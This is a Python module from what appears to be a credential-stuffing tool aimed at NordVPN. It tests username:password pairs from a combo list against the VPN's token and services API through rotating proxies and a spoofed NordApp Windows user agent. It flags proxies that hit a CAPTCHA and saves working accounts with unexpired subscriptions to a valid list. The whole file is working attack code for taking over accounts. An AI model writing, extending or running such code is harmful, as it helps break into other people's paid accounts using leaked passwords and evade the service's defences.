import requests
import re
from utils.values import settings, accounts, Proxies
from utils.utilities import proxy_getter
from datetime import datetime
import time
import base64
import json
import traceback

header_one = {
    "Accept": "\"/\"",
    "User-Agent": "NordApp windows (main/6.18.9.0) windows/Microsoft Windows NT 10.0.17134.0",
    "Content-Type": "application/x-www-form-urlencoded"
}




def check(x):
    combo = accounts.combos[x].strip()
    combo = combo.split(":")
    username = combo[0]
    password = ":".join(combo[1:])
    body_one = f"username={username}&password={password}"
    for x in range(0, int(settings.nordvpn.max_errors_per_try1)):
        proxs_list = proxy_getter(__name__)
        try:
            r_one = requests.post(url="https://zwyr157wwiu6eior.com/v1/users/tokens", headers=header_one, data=body_one, timeout=int(settings.nordvpn.timeout), proxies=proxs_list[1])
        except:
            continue
        try:
            if r_one.content.decode() != "NULL":
                if r_one.content.decode().__contains__("CAPTCHA?"):
                    Proxies.checked_json[proxs_list[0]]["bans"]["nordvpn"] = True
                    continue
                else:
                    stage_one_json = r_one.json()

                    if 'errors' in stage_one_json:
                        if stage_one_json.get("errors").get("code") == 101301:
                            pass
                        else:
                            print(stage_one_json.get("errors").get("code"))
                            print(stage_one_json)
                        accounts.invalid_nordvpn.append(f"{username}:{password}")
                        return
                    check2(username=username, password=password, stage_one_json=stage_one_json, proxs_list=proxs_list)
                    return
        except Exception as e:
            #traceback.print_exc()
            #print(combo)
            #print(1, username, r_one.text, e)
            pass
    accounts.invalid_nordvpn.append(f"{username}:{password}")

def check2(username, password, stage_one_json, proxs_list):
    proxs_list = proxs_list
    for i in range(0, int(settings.nordvpn.max_errors_per_try2)):
        try:
            token = str(stage_one_json["token"])
            token_b64 = base64.b64encode(("token:" + token).encode(encoding="utf-8")).decode("utf-8")
            header_two = {
                "Authorization": "Basic " + token_b64
            }
        except Exception as e:
            #print(2, username, stage_one_json, e)
            accounts.invalid_nordvpn.append(f"{username}:{password}")
            return
        try:
            stage_two = requests.get("https://zwyr157wwiu6eior.com/v1/users/services", headers=header_two, proxies=proxs_list[1], timeout=float(settings.nordvpn.timeout)).content
            stage_two_json = json.loads(stage_two)
        except:
            proxs_list = proxy_getter(__name__)
            continue
        expire_unix = time.mktime(datetime.strptime(stage_two_json[1]["expires_at"], "%Y-%m-%d %H:%M:%S").timetuple())
        if int(expire_unix) > int(time.time()):
            accounts.valid_nordvpn.append(f"{username}:{password}:{datetime.fromtimestamp(expire_unix).strftime('%Y-%m-%d')}")
            return
        else:
            pass
            #print(username, "is expired")
    accounts.invalid_nordvpn.append(f"{username}:{password}")
